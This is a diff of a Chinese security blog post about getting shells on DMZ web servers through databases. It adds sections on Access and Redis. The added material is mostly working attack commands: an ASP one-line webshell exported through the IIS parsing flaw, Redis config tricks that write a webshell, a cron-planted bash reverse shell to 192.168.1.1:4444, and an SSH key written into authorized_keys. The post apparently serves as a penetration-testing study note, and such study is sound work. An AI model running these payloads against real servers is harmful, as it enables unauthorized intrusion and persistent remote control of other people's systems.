@@ -22,20 +22,25 @@
     <meta name="description" content="">
     <meta name="description" content="拿下DMZ服务器权限  怎么拿？通常来说，dmz主机都是开放的网站服务器。  sql注入获得webshellmysql端口:3306 通过select into outfile实现 1’ union select 1,’‘ INTO OUTFILE ‘&#x2F;var&#x2F;www&#x2F;tmp&#x2F;nb.php’#  select ……. into outfile 命令将数据库数据导出到 一个文本文件中。这里很明显了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web服务器获取shell">
+<meta property="og:title" content="利用数据库从web服务器获取shell">
 <meta property="og:url" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/index.html">
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="拿下DMZ服务器权限  怎么拿？通常来说，dmz主机都是开放的网站服务器。  sql注入获得webshellmysql端口:3306 通过select into outfile实现 1’ union select 1,’‘ INTO OUTFILE ‘&#x2F;var&#x2F;www&#x2F;tmp&#x2F;nb.php’#  select ……. into outfile 命令将数据库数据导出到 一个文本文件中。这里很明显了。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C1.png">
+<meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C2.png">
+<meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C3.png">
+<meta property="og:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C4.png">
 <meta property="article:published_time" content="2020-09-18T13:01:44.000Z">
-<meta property="article:modified_time" content="2020-09-28T04:41:25.056Z">
+<meta property="article:modified_time" content="2020-09-28T09:13:43.800Z">
 <meta property="article:author" content="jager">
-<meta property="article:tag" content="总结，内网渗透">
+<meta property="article:tag" content="总结，渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://jager.top/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C1.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>web服务器获取shell · jager&#39;s Studio</title>
+    <title>利用数据库从web服务器获取shell · jager&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -230,7 +235,7 @@
                 <a href="/" >jager&#39;s Studio.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">web服务器获取shell</a>
+                <a href="#" class="post-name">利用数据库从web服务器获取shell</a>
             </div>
     </div>
     
@@ -260,7 +265,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            web服务器获取shell
+            利用数据库从web服务器获取shell
             <!-- 404 -->
             
         </h1>
@@ -279,13 +284,13 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "总结，内网渗透">总结，内网渗透</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "总结，渗透">总结，渗透</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -529,7 +534,68 @@ height:50vh;
 </blockquote>
 <p>3.dos命令下写文件遇到<code>&lt;&gt;</code>如何处理</p>
 <blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; <span class="number">123</span>.txt</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; <span class="number">123</span>.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><font color="red" size="6"><strong>ACCESS</strong></font></p>
+<p>思路</p>
+<p><strong>先将一句话写到数据库中，然后再通过语句写到文件中。</strong></p>
+<p>这里要将数据表内容导出到一个EXCEL文件中，因为ACCESS数据库不允许导出其他危险格式。我们导出为EXCEL后再利用<strong>IIS解析漏洞</strong>就可以用客户端连接了</p>
+<p>需要执行如下操作：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a (b <span class="built_in">varchar</span>(<span class="number">50</span>))</span><br></pre></td></tr></table></figure>
+
+<p>建立一个有一个b字段的表，表名为a,字段类型为字符,长度为50</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a (b) <span class="keyword">values</span>(<span class="string">'&lt;%execute request(chr(35))%&gt;'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在表a的b字段插入密码为#的一句话木马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">into</span> [b] <span class="keyword">in</span> <span class="string">'d:\......\e.asp;.xls'</span> <span class="string">'excel 4.0;'</span> <span class="keyword">from</span> a</span><br></pre></td></tr></table></figure>
+
+<p>把表a的内容导出为e.asp;xlsdrop</p>
+<p>其实上述3个语句用一句就可以实现：</p>
+<p>SELECT ‘&lt;%execute request(chr(35))%&gt;’ into [user] in ‘d:.…..\e.asp;.xls’ ‘excel 8.0;’ from [user]  </p>
+<p><font color="red" size="6"><strong>REDIS</strong></font></p>
+<p>端口:6379</p>
+<h4 id="redis未授权访问获取shell"><a href="#redis未授权访问获取shell" class="headerlink" title="redis未授权访问获取shell"></a>redis未授权访问获取shell</h4><p>说的简单点，就是无验证登录。</p>
+<p>思路还是一样，更改配置文件的路径到web路径下</p>
+<h5 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h5><p>利用docker搭配环境</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@iZ2ze78qsfubucq1yi73obZ ~]<span class="comment">#  docker pull ubuntu //下载ubuntu镜像</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@iZ2ze78qsfubucq1yi73obZ ~]<span class="comment">#  docker -it -p 6379:6379 -p 88:80 --name test ubuntu /bin/bash //启动容器，指定端口映射，6379是redis，88是web端口,容器名称为test</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@iZ2ze78qsfubucq1yi73obZ ~]<span class="comment">#  docker exec -it test /bin/bash //以退出不停止的方式进入test容器的shell命令行</span></span><br><span class="line"></span><br><span class="line">root@<span class="number">9</span>ee77e6ff4ab:/<span class="comment"># apt-get update</span></span><br><span class="line"></span><br><span class="line">root@<span class="number">9</span>ee77e6ff4ab:/<span class="comment"># apt-get redis-server //安装redis-server</span></span><br><span class="line"></span><br><span class="line">root@<span class="number">9</span>ee77e6ff4ab:/<span class="comment"># redis-server  //启动</span></span><br></pre></td></tr></table></figure>
+
+<p>启动后</p>
+<p><img src="/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C1.png" alt="启动完成图"></p>
+<p>利用客户端工具连接:</p>
+<p><a href="https://github.com/dmajkic/redis/downloads" target="_blank" rel="noopener">https://github.com/dmajkic/redis/downloads</a></p>
+<p><img src="/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C2.png" alt></p>
+<p><img src="/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C3.png" alt></p>
+<p><strong>利用redis写入webshell</strong></p>
+<blockquote>
+<p>需要知道web路径，需要redis未授权，需要文件读写增删改查权限</p>
+</blockquote>
+<p>靶机网站路径: /var/www/html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename test.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>访问对应路径</p>
+<p><img src="/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/E:%5Ctools%5Cblog%5Cblog%5Cmyblog%5Csource_posts%5C%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell%5C4.png" alt></p>
+<h4 id="redis计划任务反弹shell"><a href="#redis计划任务反弹shell" class="headerlink" title="redis计划任务反弹shell"></a>redis计划任务反弹shell</h4><p>连接以后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h4 id="写入公钥远程连接"><a href="#写入公钥远程连接" class="headerlink" title="写入公钥远程连接"></a>写入公钥远程连接</h4><ol>
+<li>事先先准备好自己的公钥，写入一个本地文件foo.txt。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (&#96;&#96;echo&#96; &#96;-e &#96;&#96;&quot;\n\n&quot;&#96;&#96;; &#96;&#96;cat&#96; &#96;id_rsa.pub; &#96;&#96;echo&#96; &#96;-e &#96;&#96;&quot;\n\n&quot;&#96;&#96;) &gt; foo.txt</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>通过redis将该文件写入内存</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.1.11 flushall</span><br><span class="line">$ &#96;&#96;cat&#96; &#96;foo.txt | redis-cli -h 192.168.1.11 -x &#96;&#96;set&#96; &#96;crackit</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>利用redis-cli 写入配置的方式将公钥写入到.<code>ssh</code>目录下</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.1.11</span><br><span class="line">192.168.1.11:6379&gt; config &#96;&#96;set&#96; &#96;dir&#96; &#96;&#x2F;Users&#x2F;antirez&#x2F;&#96;&#96;.&#96;&#96;ssh&#96;&#96;&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; config get &#96;&#96;dir</span><br><span class="line">1) &#96;&#96;&quot;dir&quot;</span><br><span class="line">2) &#96;&#96;&quot;&#x2F;Users&#x2F;antirez&#x2F;.ssh&quot;</span><br><span class="line">192.168.1.11:6379&gt; config &#96;&#96;set&#96; &#96;dbfilename &#96;&#96;&quot;authorized_keys&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p> 4.公钥登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh&#96; &#96;-i redis.pub root@192.168.192.133</span><br></pre></td></tr></table></figure>
+
+<h4 id="redis主从复制漏洞获取shell"><a href="#redis主从复制漏洞获取shell" class="headerlink" title="redis主从复制漏洞获取shell"></a>redis主从复制漏洞获取shell</h4><p>在docker等容器中没有其他服务，无法通过计划任务，webshell等方式写文件获取shell</p>
 
     </article>
     <!-- license  -->
@@ -651,7 +717,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#怎么拿？"><span class="toc-number">1.</span> <span class="toc-text">怎么拿？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入获得webshell"><span class="toc-number">2.</span> <span class="toc-text">sql注入获得webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">2.1.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过select-into-outfile实现"><span class="toc-number">2.1.1.</span> <span class="toc-text">通过select into outfile实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#慢查询日志-slow-query-log"><span class="toc-number">2.1.2.</span> <span class="toc-text">慢查询日志(slow query log)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一般查询日志"><span class="toc-number">2.1.3.</span> <span class="toc-text">一般查询日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlserver-mssql"><span class="toc-number">2.2.</span> <span class="toc-text">sqlserver&#x2F;mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SA权限开启xp-cmdshell获取主机权限"><span class="toc-number">2.2.1.</span> <span class="toc-text">SA权限开启xp_cmdshell获取主机权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建临时表"><span class="toc-number">2.2.2.</span> <span class="toc-text">创建临时表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在WINDOWS下查找文件用如下命令："><span class="toc-number">2.2.3.</span> <span class="toc-text">在WINDOWS下查找文件用如下命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用xp-cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中"><span class="toc-number">2.2.4.</span> <span class="toc-text">用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#总结"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#怎么拿？"><span class="toc-number">1.</span> <span class="toc-text">怎么拿？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入获得webshell"><span class="toc-number">2.</span> <span class="toc-text">sql注入获得webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">2.1.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过select-into-outfile实现"><span class="toc-number">2.1.1.</span> <span class="toc-text">通过select into outfile实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#慢查询日志-slow-query-log"><span class="toc-number">2.1.2.</span> <span class="toc-text">慢查询日志(slow query log)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一般查询日志"><span class="toc-number">2.1.3.</span> <span class="toc-text">一般查询日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlserver-mssql"><span class="toc-number">2.2.</span> <span class="toc-text">sqlserver&#x2F;mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SA权限开启xp-cmdshell获取主机权限"><span class="toc-number">2.2.1.</span> <span class="toc-text">SA权限开启xp_cmdshell获取主机权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建临时表"><span class="toc-number">2.2.2.</span> <span class="toc-text">创建临时表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在WINDOWS下查找文件用如下命令："><span class="toc-number">2.2.3.</span> <span class="toc-text">在WINDOWS下查找文件用如下命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用xp-cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中"><span class="toc-number">2.2.4.</span> <span class="toc-text">用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#总结"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis未授权访问获取shell"><span class="toc-number">2.2.5.</span> <span class="toc-text">redis未授权访问获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#环境搭配"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">环境搭配</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis计划任务反弹shell"><span class="toc-number">2.2.6.</span> <span class="toc-text">redis计划任务反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#写入公钥远程连接"><span class="toc-number">2.2.7.</span> <span class="toc-text">写入公钥远程连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis主从复制漏洞获取shell"><span class="toc-number">2.2.8.</span> <span class="toc-text">redis主从复制漏洞获取shell</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -766,7 +832,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/" >web服务器获取shell</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2020/09/18/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%8E%B7%E5%8F%96shell/" >利用数据库从web服务器获取shell</a>
         </li>
     
     
@@ -844,9 +910,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="攻防对抗"><span class="iconfont-archer">&#xe606;</span>攻防对抗</span>
     
-        <span class="sidebar-tag-name" data-tags="总结，内网渗透"><span class="iconfont-archer">&#xe606;</span>总结，内网渗透</span>
-    
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结，渗透"><span class="iconfont-archer">&#xe606;</span>总结，渗透</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
